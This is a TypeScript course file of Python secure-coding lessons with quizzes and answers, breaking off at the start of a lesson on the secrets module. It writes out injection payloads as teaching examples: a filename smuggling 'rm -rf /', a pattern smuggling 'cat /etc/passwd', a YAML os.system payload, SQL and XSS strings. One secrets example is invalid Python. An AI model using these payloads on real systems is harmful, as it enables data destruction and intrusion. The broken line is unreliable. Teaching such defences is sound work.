import type { Stage } from "@/course/course.schema";

export const stage38 = {
  id: "stage-38",
  number: 38,
  title: "Security, Secrets, Cryptography Interfaces, and Safe Coding",
  summary:
    "Master security, secrets, cryptography interfaces, and safe coding through worked examples, interactive exercises, and a hands-on project.",
  level: "advanced",
  masteryGateConceptIds: ["security-trust-boundaries", "cryptography"],
  lessons: [
    // ── 38.1 Trust Boundaries ─────────────────────────────────────────────
    {
      id: "s38-trust-boundaries",
      stageId: "stage-38",
      title: "Trust Boundaries",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Define trust boundaries in a Python application",
        "Identify all inputs that cross a trust boundary",
        "Apply the principle of never trusting data from outside your system",
      ],
      prerequisites: [],
      concepts: ["security-trust-boundaries"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## Trust Boundaries\n\nA **trust boundary** separates code that you control from data or code that you don't. The most important security rule:\n\n> **Never trust anything that crosses a trust boundary without validation.**\n\nCommon trust boundary crossings:\n- User input (CLI args, form fields, environment variables)\n- Files on disk (can be modified by anyone with file-system access)\n- Network responses (can be tampered in transit)\n- Database values (may have been injected earlier)\n- Third-party libraries (may have supply-chain vulnerabilities)",
        },
        {
          kind: "mental-model",
          title: "Airport security checkpoint",
          analogy: "A trust boundary is like an airport security checkpoint. Everything inside the terminal (your running process) is trusted. Everything arriving from outside (user input, network data) must pass inspection before being allowed in.",
          explanation: "Just as airport security checks bags before letting them into the terminal, your code must validate data before using it. The checkpoint is the validation code at the boundary.",
        },
        {
          kind: "callout",
          variant: "warning",
          title: "Environment variables are external data",
          body: "Many developers forget that environment variables are set by the caller and may be adversarially crafted. Validate and sanitize them just like user input.",
        },
        {
          kind: "why-matters",
          body: "Most security vulnerabilities (injection attacks, path traversal, command injection, SSRF) trace back to trusting data that crosses a trust boundary without validation. Identifying your trust boundaries is the first step in a security review.",
        },
      ],
      interactions: [
        {
          id: "s38-trust-boundaries-mc",
          kind: "multiple-choice",
          prompt: "Which of these is NOT a trust boundary crossing in a web application?",
          beginnerPurpose: "Identify what counts as untrusted input",
          expectedConceptIds: ["security-trust-boundaries"],
          options: [
            { id: "a", text: "A value read from an HTTP query parameter", isCorrect: false, explanation: "HTTP parameters come from users — always a trust boundary." },
            { id: "b", text: "A constant string defined in your Python source file", isCorrect: true, explanation: "Correct! Source code constants are under your control — no boundary crossing." },
            { id: "c", text: "A value from an environment variable", isCorrect: false, explanation: "Environment variables are set by the caller and must be validated." },
            { id: "d", text: "Content read from a file uploaded by a user", isCorrect: false, explanation: "User-uploaded files are untrusted and must be validated." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "Ask: 'Can an attacker control this value?' If yes, it crosses a trust boundary." }],
          feedback: {
            correct: "Correct! Source code constants are in your control — no boundary crossing.",
            incorrect: "Only data from your own source code (hardcoded values) is inherently trusted.",
          },
        },
        {
          id: "s38-trust-boundaries-explain",
          kind: "plain-language-explain",
          prompt: "Explain what a trust boundary is and give two examples of inputs that cross one.",
          beginnerPurpose: "Articulate the trust boundary concept clearly",
          expectedConceptIds: ["security-trust-boundaries"],
          code: `import sys, os

# Which of these requires validation?
user_arg = sys.argv[1]       # (a)
app_constant = "SECRET_KEY"  # (b)
env_var = os.environ["DB_URL"]  # (c)`,
          keyPointsToHit: [
            "A trust boundary separates data you control from data you don't",
            "User input crosses a trust boundary",
            "Environment variables cross a trust boundary",
            "Source code constants do not cross a trust boundary",
          ],
          sampleAnswer: "A trust boundary is the line between your controlled code and external data. sys.argv[1] comes from the user — it crosses a trust boundary and needs validation. os.environ['DB_URL'] is set by whoever starts your process — also a trust boundary. app_constant = 'SECRET_KEY' is in your source code and always trusted.",
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "Focus on: who controls this value? You, or someone else?" }],
          feedback: {
            correct: "Excellent! You correctly identified controlled vs external data.",
            incorrect: "Key idea: anything controlled by an external party (user, environment, network) crosses a trust boundary.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "security-trust-boundaries", recallPrompt: "Name three types of inputs that cross trust boundaries.", nextReviewAfterDays: 3 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-trust-boundaries-mc", "s38-trust-boundaries-explain"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.2 Input Validation ─────────────────────────────────────────────
    {
      id: "s38-input-validation",
      stageId: "stage-38",
      title: "Input Validation",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Validate data types, ranges, and formats before use",
        "Use allowlists instead of denylists for validation",
        "Raise informative errors for invalid inputs",
      ],
      prerequisites: ["s38-trust-boundaries"],
      concepts: ["security-trust-boundaries"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## Input Validation\n\nInput validation checks that external data meets your expectations **before** you use it. Validation principles:\n\n1. **Validate type** — is it a string, int, list?\n2. **Validate format** — does it match a pattern (email, UUID, filename)?\n3. **Validate range/length** — is the number in bounds? Is the string too long?\n4. **Use allowlists, not denylists** — specify what is allowed, not what is blocked\n\n```python\n# Allowlist: only accept known-good values\nALLOWED_FORMATS = {'csv', 'json', 'xml'}\nif fmt not in ALLOWED_FORMATS:\n    raise ValueError(f\"Unknown format: {fmt!r}\")\n```",
        },
        {
          kind: "comparison",
          leftLabel: "Denylist (weak)",
          rightLabel: "Allowlist (strong)",
          leftCode: `# Blocks known-bad values — easy to bypass
BAD = {'../', '..\\\\', '/etc/'}
if any(p in path for p in BAD):
    raise ValueError("Bad path")
# Attacker uses: ....// or %2e%2e`,
          rightCode: `# Allows only known-good values
import re
if not re.fullmatch(r'[a-zA-Z0-9_-]+\\.txt', filename):
    raise ValueError("Invalid filename")
# Anything not matching the pattern is rejected`,
          caption: "Allowlists are far more secure than denylists",
        },
        {
          kind: "code",
          language: "python",
          code: `import re
from typing import Any

def validate_username(raw: Any) -> str:
    if not isinstance(raw, str):
        raise TypeError(f"username must be str, got {type(raw).__name__}")
    if not 3 <= len(raw) <= 32:
        raise ValueError(f"username length must be 3-32, got {len(raw)}")
    if not re.fullmatch(r'[a-zA-Z0-9_]+', raw):
        raise ValueError(f"username may only contain letters, digits, underscores")
    return raw

validate_username("alice_99")   # OK
validate_username("../etc")     # ValueError
validate_username("a" * 100)    # ValueError`,
          caption: "Validate type, length, and format with an allowlist pattern",
        },
        {
          kind: "why-matters",
          body: "Input validation is the primary defense against injection attacks (SQL injection, command injection, SSTI). Every field that accepts external data is a potential injection point if not validated.",
        },
      ],
      interactions: [
        {
          id: "s38-input-validation-mc",
          kind: "multiple-choice",
          prompt: "Why are allowlists generally more secure than denylists for input validation?",
          beginnerPurpose: "Understand the core principle of allowlist vs denylist",
          expectedConceptIds: ["security-trust-boundaries"],
          options: [
            { id: "a", text: "Allowlists are faster to execute", isCorrect: false, explanation: "Performance is not the reason — security is." },
            { id: "b", text: "Allowlists only permit explicitly approved values, blocking all unknown inputs by default", isCorrect: true, explanation: "Correct! Denylists can be bypassed with novel variants; allowlists reject anything not on the list." },
            { id: "c", text: "Denylists require more code to maintain", isCorrect: false, explanation: "Both require maintenance; the fundamental difference is security model." },
            { id: "d", text: "Allowlists prevent all injection attacks automatically", isCorrect: false, explanation: "Allowlists greatly reduce risk but must be combined with output escaping and parameterized queries." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "Consider: what does a denylist miss when an attacker uses a novel encoding?" }],
          feedback: {
            correct: "Correct! Allowlists are closed by default — only listed values pass.",
            incorrect: "Allowlist = closed-by-default (anything not listed is rejected). Denylist = open-by-default (only listed patterns blocked).",
          },
        },
        {
          id: "s38-input-validation-fill",
          kind: "fill-code",
          prompt: "Complete the validation to only accept filenames matching 'name.txt' pattern (letters/digits/underscores, .txt extension).",
          beginnerPurpose: "Practice allowlist-based filename validation",
          expectedConceptIds: ["security-trust-boundaries"],
          codeTemplate: `import re
def validate_filename(name: str) -> str:
    if not re.fullmatch(r'___\\.txt', name):
        raise ValueError(f"Invalid filename: {name!r}")
    return name`,
          blanks: [
            { placeholder: "___", answer: "[a-zA-Z0-9_]+", caseSensitive: true },
          ],
          allowedAttempts: 3,
          hints: [{ level: "syntax", text: "Use a character class [a-zA-Z0-9_]+ to match one or more allowed characters." }],
          feedback: {
            correct: "Correct! [a-zA-Z0-9_]+ matches only safe characters — an allowlist pattern.",
            incorrect: "Use [a-zA-Z0-9_]+ to allow only letters, digits, and underscores before .txt.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "security-trust-boundaries", recallPrompt: "Why prefer allowlists over denylists for input validation?", nextReviewAfterDays: 3 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-input-validation-mc", "s38-input-validation-fill"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.3 Output Escaping ──────────────────────────────────────────────
    {
      id: "s38-output-escaping",
      stageId: "stage-38",
      title: "Output Escaping",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Explain why output escaping prevents injection attacks",
        "Use html.escape for HTML output",
        "Use parameterized queries instead of string formatting for SQL",
      ],
      prerequisites: ["s38-input-validation"],
      concepts: ["security-trust-boundaries"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## Output Escaping\n\nEven after validation, user data can inject code when inserted into another language (HTML, SQL, shell). **Output escaping** transforms special characters so they are treated as data, not code.\n\nThe rule: **escape data for the target language at the point of use**, not earlier.",
        },
        {
          kind: "comparison",
          leftLabel: "Unsafe HTML output",
          rightLabel: "Safe HTML output",
          leftCode: `# XSS vulnerability:
name = '<script>alert(1)</script>'
html = f"<p>Hello, {name}!</p>"
# Injects JavaScript into the page`,
          rightCode: `import html
name = '<script>alert(1)</script>'
safe = html.escape(name)
result = f"<p>Hello, {safe}!</p>"
# <p>Hello, &lt;script&gt;...&lt;/script&gt;!</p>`,
          caption: "html.escape converts < > & \" ' to safe HTML entities",
        },
        {
          kind: "comparison",
          leftLabel: "SQL injection (unsafe)",
          rightLabel: "Parameterized query (safe)",
          leftCode: `# SQL INJECTION:
user = "'; DROP TABLE users; --"
query = f"SELECT * FROM users WHERE name='{user}'"
cursor.execute(query)  # DANGER`,
          rightCode: `# Safe parameterized query:
user = "'; DROP TABLE users; --"
cursor.execute(
    "SELECT * FROM users WHERE name=?",
    (user,)
)  # user is data, never code`,
          caption: "Always use parameterized queries for SQL — never string interpolation",
        },
        {
          kind: "callout",
          variant: "danger",
          title: "Parameterized queries are non-negotiable",
          body: "SQL injection is still the #1 web vulnerability (OWASP Top 10). Using f-strings or % formatting to build SQL queries is always wrong. Every database driver supports parameterized queries — use them.",
        },
        {
          kind: "why-matters",
          body: "XSS (Cross-Site Scripting) and SQL injection are two of the most prevalent and costly web vulnerabilities. Both are completely prevented by consistent output escaping and parameterized queries.",
        },
      ],
      interactions: [
        {
          id: "s38-output-escaping-mc",
          kind: "multiple-choice",
          prompt: "A user submits the name `O'Brien` to a form. Which approach correctly inserts it into a SQLite query?",
          beginnerPurpose: "Apply parameterized queries to handle special characters safely",
          expectedConceptIds: ["security-trust-boundaries"],
          options: [
            { id: "a", text: "cursor.execute(f\"INSERT INTO users VALUES ('{name}')\")", isCorrect: false, explanation: "String interpolation in SQL is SQL injection. The apostrophe in O'Brien breaks the query." },
            { id: "b", text: "cursor.execute(\"INSERT INTO users VALUES (?)\", (name,))", isCorrect: true, explanation: "Correct! The parameterized form treats the value as data, never code." },
            { id: "c", text: "cursor.execute(\"INSERT INTO users VALUES ('\" + name.replace(\"'\", \"\") + \"')\")", isCorrect: false, explanation: "Removing single quotes is a denylist — insufficient and fragile." },
            { id: "d", text: "cursor.execute(\"INSERT INTO users VALUES ('%s')\" % name)", isCorrect: false, explanation: "% formatting is still string interpolation into SQL — still injection." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "syntax", text: "Parameterized form: cursor.execute('SQL with ?', (value,))" }],
          feedback: {
            correct: "Correct! Parameterized queries always treat user data as data, not SQL code.",
            incorrect: "Only parameterized queries (? placeholders) are safe. String formatting is SQL injection.",
          },
        },
        {
          id: "s38-output-escaping-fill",
          kind: "fill-code",
          prompt: "Escape user input before inserting it into an HTML template.",
          beginnerPurpose: "Practice html.escape to prevent XSS",
          expectedConceptIds: ["security-trust-boundaries"],
          codeTemplate: `import html
user_input = '<img src=x onerror=alert(1)>'
safe = html.___(user_input)
print(f"<div>{safe}</div>")`,
          blanks: [
            { placeholder: "___", answer: "escape", caseSensitive: true },
          ],
          allowedAttempts: 3,
          hints: [{ level: "syntax", text: "html.escape(s) converts < > & \" ' to HTML entities." }],
          feedback: {
            correct: "Correct! html.escape() neutralizes HTML special characters.",
            incorrect: "Use html.escape(user_input) to convert < to &lt; and > to &gt;.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "security-trust-boundaries", recallPrompt: "Why are parameterized queries safer than f-string SQL?", nextReviewAfterDays: 3 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-output-escaping-mc", "s38-output-escaping-fill"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.4 Safe File Paths ──────────────────────────────────────────────
    {
      id: "s38-safe-file-paths",
      stageId: "stage-38",
      title: "Safe File Paths",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Detect path-traversal attacks using pathlib.resolve",
        "Validate that a user-supplied path stays inside a safe directory",
        "Reject absolute paths and directory traversal sequences",
      ],
      prerequisites: ["s38-input-validation"],
      concepts: ["security-trust-boundaries"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## Safe File Paths\n\n**Path traversal** (directory traversal) attacks use sequences like `../../etc/passwd` to escape a safe directory. Defense:\n\n1. Resolve the path to an absolute canonical form\n2. Check that it starts with the allowed base directory\n\n```python\nfrom pathlib import Path\n\ndef safe_path(base: str, user_filename: str) -> Path:\n    base_dir = Path(base).resolve()\n    target = (base_dir / user_filename).resolve()\n    if not str(target).startswith(str(base_dir)):\n        raise ValueError(\"Path traversal detected\")\n    return target\n```",
        },
        {
          kind: "code",
          language: "python",
          code: `from pathlib import Path

BASE = Path("/var/app/uploads").resolve()

def safe_open(filename: str) -> Path:
    # Reject absolute paths immediately
    if Path(filename).is_absolute():
        raise ValueError(f"Absolute paths not allowed: {filename!r}")
    # Resolve to canonical form and check containment
    target = (BASE / filename).resolve()
    if not target.is_relative_to(BASE):
        raise ValueError(f"Path traversal detected: {filename!r}")
    return target

safe_open("report.pdf")        # OK
safe_open("../../etc/passwd")  # ValueError
safe_open("/etc/passwd")       # ValueError`,
          caption: "Resolve + is_relative_to blocks all path traversal variants",
        },
        {
          kind: "callout",
          variant: "tip",
          title: "Path.is_relative_to() was added in Python 3.9",
          body: "On Python 3.8, use str(target).startswith(str(base_dir) + os.sep) instead. On 3.9+, target.is_relative_to(base_dir) is cleaner.",
        },
        {
          kind: "why-matters",
          body: "Path traversal vulnerabilities have allowed attackers to read configuration files, private keys, and database credentials from web servers. A two-line resolve + containment check prevents all of them.",
        },
      ],
      interactions: [
        {
          id: "s38-safe-file-paths-mc",
          kind: "multiple-choice",
          prompt: "What does Path.resolve() do that makes it useful for safe path validation?",
          beginnerPurpose: "Understand why resolve is needed",
          expectedConceptIds: ["security-trust-boundaries"],
          options: [
            { id: "a", text: "It checks file permissions", isCorrect: false, explanation: "resolve() resolves symlinks and normalizes the path — it doesn't check permissions." },
            { id: "b", text: "It converts a path to its canonical absolute form, resolving .. and symlinks", isCorrect: true, explanation: "Correct! resolve() expands .. components and symlinks, so '../../etc/passwd' becomes '/etc/passwd'." },
            { id: "c", text: "It validates that the file exists", isCorrect: false, explanation: "resolve() on a non-existent path raises FileNotFoundError only if strict=True." },
            { id: "d", text: "It removes double slashes from paths", isCorrect: false, explanation: "resolve() does more than remove double slashes — it canonicalizes the entire path." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "What does (BASE / '../../etc/passwd').resolve() return?" }],
          feedback: {
            correct: "Correct! resolve() canonicalizes the path, so you can reliably check containment.",
            incorrect: "resolve() expands .. and symlinks — after resolving, you can check if the result is inside BASE.",
          },
        },
        {
          id: "s38-safe-file-paths-fill",
          kind: "fill-code",
          prompt: "Complete the safe path check using is_relative_to.",
          beginnerPurpose: "Practice the resolve + is_relative_to pattern",
          expectedConceptIds: ["security-trust-boundaries"],
          codeTemplate: `from pathlib import Path
BASE = Path("/data").resolve()

def check(filename: str) -> Path:
    target = (BASE / filename).___()
    if not target.___(BASE):
        raise ValueError("Path traversal!")
    return target`,
          blanks: [
            { placeholder: "___", answer: "resolve", caseSensitive: true },
            { placeholder: "___", answer: "is_relative_to", caseSensitive: true },
          ],
          allowedAttempts: 3,
          hints: [{ level: "syntax", text: ".resolve() for canonical form; .is_relative_to(base) to check containment." }],
          feedback: {
            correct: "Correct! resolve() then is_relative_to() is the standard path-traversal defense.",
            incorrect: "First .resolve() the target, then check .is_relative_to(BASE).",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "security-trust-boundaries", recallPrompt: "What two-step check prevents path traversal attacks?", nextReviewAfterDays: 3 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-safe-file-paths-mc", "s38-safe-file-paths-fill"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.5 Safe Subprocess Usage ────────────────────────────────────────
    {
      id: "s38-safe-subprocess",
      stageId: "stage-38",
      title: "Safe subprocess Usage",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Pass commands as lists to avoid shell injection",
        "Avoid shell=True when user data is involved",
        "Use shlex.split safely when parsing shell strings",
      ],
      prerequisites: ["s38-input-validation"],
      concepts: ["security-trust-boundaries"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## Safe subprocess Usage\n\n`subprocess.run` with `shell=True` and user data is **command injection**:\n\n```python\n# DANGEROUS — user controls filename\nfilename = \"report.pdf; rm -rf /\"\nsubprocess.run(f\"pdfinfo {filename}\", shell=True)  # runs rm -rf /!\n```\n\n**Safe pattern**: pass the command as a list — no shell interprets special characters:\n\n```python\n# SAFE — list form, no shell expansion\nsubprocess.run([\"pdfinfo\", filename])  # filename is just an argument\n```",
        },
        {
          kind: "comparison",
          leftLabel: "Dangerous (shell=True)",
          rightLabel: "Safe (list form)",
          leftCode: `# Shell injection risk:
subprocess.run(
    f"convert {user_file} output.png",
    shell=True
)`,
          rightCode: `# No injection possible:
subprocess.run(
    ["convert", user_file, "output.png"],
    shell=False  # default
)`,
          caption: "Always use list form with user-controlled arguments",
        },
        {
          kind: "callout",
          variant: "danger",
          title: "shell=True with user data is command injection",
          body: "When shell=True, the entire command string is passed to /bin/sh. Semicolons, pipes, backticks, and $(...) all execute additional commands. Unless user data is fully validated against a strict allowlist, never use shell=True.",
        },
        {
          kind: "why-matters",
          body: "Command injection via subprocess is a critical vulnerability that gives attackers shell access to your server. The fix is always the same: use list form and avoid shell=True.",
        },
      ],
      interactions: [
        {
          id: "s38-safe-subprocess-mc",
          kind: "multiple-choice",
          prompt: "A script runs: subprocess.run(f'grep {pattern} log.txt', shell=True). An attacker sets pattern to '; cat /etc/passwd'. What happens?",
          beginnerPurpose: "Identify command injection via shell=True",
          expectedConceptIds: ["security-trust-boundaries"],
          options: [
            { id: "a", text: "grep runs normally; the semicolon is treated as a literal character", isCorrect: false, explanation: "With shell=True, the shell interprets the semicolon as a command separator." },
            { id: "b", text: "The shell runs grep AND then cat /etc/passwd", isCorrect: true, explanation: "Correct! The semicolon terminates the grep command; the shell then runs cat /etc/passwd." },
            { id: "c", text: "subprocess raises an error because of the semicolon", isCorrect: false, explanation: "subprocess doesn't validate the command string — the shell executes it as-is." },
            { id: "d", text: "The script crashes with a SyntaxError", isCorrect: false, explanation: "SyntaxError would be a Python syntax error, not a subprocess error." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "With shell=True, the shell sees: grep ; cat /etc/passwd log.txt" }],
          feedback: {
            correct: "Correct! shell=True makes the shell interpret ; as a command separator — command injection.",
            incorrect: "shell=True passes the whole string to /bin/sh. The shell sees 'grep ; cat /etc/passwd' as two commands.",
          },
        },
        {
          id: "s38-safe-subprocess-fill",
          kind: "fill-code",
          prompt: "Rewrite the unsafe command to use list form.",
          beginnerPurpose: "Convert shell=True usage to safe list form",
          expectedConceptIds: ["security-trust-boundaries"],
          codeTemplate: `import subprocess
filename = "report.pdf"
# SAFE version:
result = subprocess.run(
    [___, ___],
    capture_output=True
)`,
          blanks: [
            { placeholder: "___", answer: '"pdfinfo"', caseSensitive: false },
            { placeholder: "___", answer: "filename", caseSensitive: true },
          ],
          allowedAttempts: 3,
          hints: [{ level: "syntax", text: "List form: ['command', argument1, argument2, ...]" }],
          feedback: {
            correct: "Correct! List form passes each argument separately — no shell interpretation.",
            incorrect: "Pass a list: ['pdfinfo', filename]. Python passes each element as a separate argument.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "security-trust-boundaries", recallPrompt: "Why is shell=True dangerous with user-supplied data?", nextReviewAfterDays: 3 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-safe-subprocess-mc", "s38-safe-subprocess-fill"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.6 Safe Deserialization ─────────────────────────────────────────
    {
      id: "s38-safe-deserialization",
      stageId: "stage-38",
      title: "Safe Deserialization",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Identify insecure deserialization patterns (pickle, yaml.load)",
        "Use json.loads and yaml.safe_load for untrusted data",
        "Explain when signing pickled data is an acceptable approach",
      ],
      prerequisites: ["s38-trust-boundaries"],
      concepts: ["security-trust-boundaries"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## Safe Deserialization\n\nSeveral Python deserialization functions can execute arbitrary code:\n\n| Unsafe | Safe alternative |\n|--------|------------------|\n| `pickle.loads(untrusted)` | `json.loads(untrusted)` |\n| `yaml.load(untrusted)` | `yaml.safe_load(untrusted)` |\n| `marshal.loads(untrusted)` | `json.loads(untrusted)` |\n| `eval(untrusted)` | literal_eval or a parser |\n\nThe rule: **use data-only formats (JSON, TOML) for untrusted inputs**.",
        },
        {
          kind: "comparison",
          leftLabel: "Unsafe YAML load",
          rightLabel: "Safe YAML load",
          leftCode: `import yaml
# yaml.load can execute Python code:
data = yaml.load(user_input, Loader=yaml.Loader)
# Attacker: "!!python/object/apply:os.system ['id']"`,
          rightCode: `import yaml
# safe_load only parses data:
data = yaml.safe_load(user_input)
# !!python/object/... tags raise an error`,
          caption: "Always use yaml.safe_load for untrusted YAML",
        },
        {
          kind: "callout",
          variant: "warning",
          title: "ast.literal_eval is NOT exec",
          body: "ast.literal_eval(s) safely evaluates only Python literals (strings, numbers, tuples, lists, dicts, booleans, None). It does not execute arbitrary expressions. Use it instead of eval() for simple config parsing.",
        },
        {
          kind: "why-matters",
          body: "CWE-502 (Deserialization of Untrusted Data) is in the OWASP Top 10. Real-world incidents include machine-learning APIs that allowed RCE via pickled model payloads and Redis caches that stored pickled objects accessible to attackers.",
        },
      ],
      interactions: [
        {
          id: "s38-safe-deser-mc",
          kind: "multiple-choice",
          prompt: "Which function safely parses untrusted YAML?",
          beginnerPurpose: "Know the safe YAML loading function",
          expectedConceptIds: ["security-trust-boundaries"],
          options: [
            { id: "a", text: "yaml.load(data, Loader=yaml.Loader)", isCorrect: false, explanation: "yaml.Loader can execute Python objects embedded in YAML." },
            { id: "b", text: "yaml.safe_load(data)", isCorrect: true, explanation: "Correct! yaml.safe_load only parses plain data types — no arbitrary Python execution." },
            { id: "c", text: "yaml.load(data, Loader=yaml.FullLoader)", isCorrect: false, explanation: "FullLoader restricts some constructs but is not fully safe for untrusted input." },
            { id: "d", text: "yaml.parse(data)", isCorrect: false, explanation: "yaml.parse() is a low-level parser — not intended for safe deserialization." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "syntax", text: "The safe function has 'safe' in its name." }],
          feedback: {
            correct: "Correct! yaml.safe_load() restricts to plain data types only.",
            incorrect: "yaml.safe_load() is the only safe choice for untrusted YAML.",
          },
        },
        {
          id: "s38-safe-deser-fill",
          kind: "fill-code",
          prompt: "Replace the unsafe pickle with a safe JSON deserialization.",
          beginnerPurpose: "Convert pickle usage to JSON",
          expectedConceptIds: ["security-trust-boundaries"],
          codeTemplate: `import json
# Received from network (untrusted):
raw = b'{"user": "alice", "role": "admin"}'
# Safe deserialization:
data = json.___(raw)
print(data["user"])`,
          blanks: [
            { placeholder: "___", answer: "loads", caseSensitive: true },
          ],
          allowedAttempts: 3,
          hints: [{ level: "syntax", text: "json.loads(bytes_or_str) parses JSON data." }],
          feedback: {
            correct: "Correct! json.loads() is safe for untrusted data — it cannot execute code.",
            incorrect: "json.loads(raw) parses JSON into Python dicts/lists — no code execution possible.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "security-trust-boundaries", recallPrompt: "What is the safe alternative to yaml.load for untrusted YAML?", nextReviewAfterDays: 3 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-safe-deser-mc", "s38-safe-deser-fill"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.7 Secrets in Environment Variables ─────────────────────────────
    {
      id: "s38-secrets-env-vars",
      stageId: "stage-38",
      title: "Secrets in Environment Variables",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Read secrets from environment variables using os.environ",
        "Avoid hardcoding secrets in source code",
        "Explain why .env files should never be committed to git",
      ],
      prerequisites: ["s38-trust-boundaries"],
      concepts: ["security-trust-boundaries"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## Secrets in Environment Variables\n\nNever hardcode secrets in source code:\n\n```python\n# WRONG — secret committed to git forever:\nAPI_KEY = \"sk-abc123secretkey\"\n```\n\nInstead, read secrets from environment variables:\n\n```python\nimport os\nAPI_KEY = os.environ[\"MY_API_KEY\"]  # raises KeyError if not set\n# or with a default:\nAPI_KEY = os.environ.get(\"MY_API_KEY\") or raise ValueError(\"MY_API_KEY not set\")\n```\n\nUse `.env` files locally with `python-dotenv`, but add `.env` to `.gitignore`.",
        },
        {
          kind: "callout",
          variant: "danger",
          title: "Secrets in git are permanent",
          body: "Once a secret is committed to a git repository, it exists forever in history — even after deletion. Rotate any secret that has ever been committed. Use `git secret` or environment-based secrets management from day one.",
        },
        {
          kind: "code",
          language: "python",
          code: `import os

def get_required_secret(name: str) -> str:
    """Read a required secret from environment; raise clearly if missing."""
    value = os.environ.get(name)
    if not value:
        raise EnvironmentError(
            f"Required environment variable {name!r} is not set. "
            f"Add it to your .env file or deployment secrets."
        )
    return value

# Usage
DB_PASSWORD = get_required_secret("DB_PASSWORD")
API_TOKEN   = get_required_secret("API_TOKEN")`,
          caption: "A helper that raises a clear error for missing secrets",
        },
        {
          kind: "why-matters",
          body: "Leaked secrets are the root cause of major breaches — AWS keys in GitHub, database passwords in Docker images, API tokens in PyPI packages. Environment-based secret management prevents the most common source of credential exposure.",
        },
      ],
      interactions: [
        {
          id: "s38-secrets-env-mc",
          kind: "multiple-choice",
          prompt: "A developer adds `API_KEY = 'secret123'` to the code and commits to a public GitHub repo. After realizing the mistake, they delete the line and push again. Is the secret safe?",
          beginnerPurpose: "Understand git history and credential rotation",
          expectedConceptIds: ["security-trust-boundaries"],
          options: [
            { id: "a", text: "Yes — the secret was deleted, so it is gone", isCorrect: false, explanation: "Git preserves full history. The secret exists in prior commits and can be retrieved with git log." },
            { id: "b", text: "No — git history preserves the deleted commit; the secret must be rotated", isCorrect: true, explanation: "Correct! The commit is still in git history. Attackers clone the repo and run git log to find it." },
            { id: "c", text: "Yes — GitHub scans and removes secrets automatically", isCorrect: false, explanation: "GitHub may send alerts but does not rewrite history. The secret remains." },
            { id: "d", text: "Only if the repo is public — private repos are safe", isCorrect: false, explanation: "Private repos can become public, can be forked, and can be accessed by team members. Always rotate." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "git log --all shows every commit, including deleted content." }],
          feedback: {
            correct: "Correct! Committed secrets live in git history forever. Always rotate compromised credentials.",
            incorrect: "Git history is permanent. Even after deletion, the secret is in prior commits. Rotate it.",
          },
        },
        {
          id: "s38-secrets-env-fill",
          kind: "fill-code",
          prompt: "Read the DB_URL from environment, raising EnvironmentError if it is not set.",
          beginnerPurpose: "Practice reading required environment variables",
          expectedConceptIds: ["security-trust-boundaries"],
          codeTemplate: `import os
db_url = os.environ.___("DB_URL")
if not db_url:
    raise EnvironmentError("DB_URL is required")`,
          blanks: [
            { placeholder: "___", answer: "get", caseSensitive: true },
          ],
          allowedAttempts: 3,
          hints: [{ level: "syntax", text: "os.environ.get(name) returns None if the variable is not set." }],
          feedback: {
            correct: "Correct! os.environ.get('NAME') returns None if not set, letting you check and raise.",
            incorrect: "os.environ.get('NAME') returns None for missing variables — then check and raise.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "security-trust-boundaries", recallPrompt: "Why must you rotate a secret even after deleting it from git?", nextReviewAfterDays: 3 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-secrets-env-mc", "s38-secrets-env-fill"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.8 secrets module ───────────────────────────────────────────────
    {
      id: "s38-secrets-module",
      stageId: "stage-38",
      title: "The secrets Module",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Generate cryptographically secure tokens with secrets.token_urlsafe",
        "Generate random integers in a range securely with secrets.randbelow",
        "Explain why secrets is preferable to random for security tokens",
      ],
      prerequisites: ["s38-secrets-env-vars"],
      concepts: ["cryptography"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
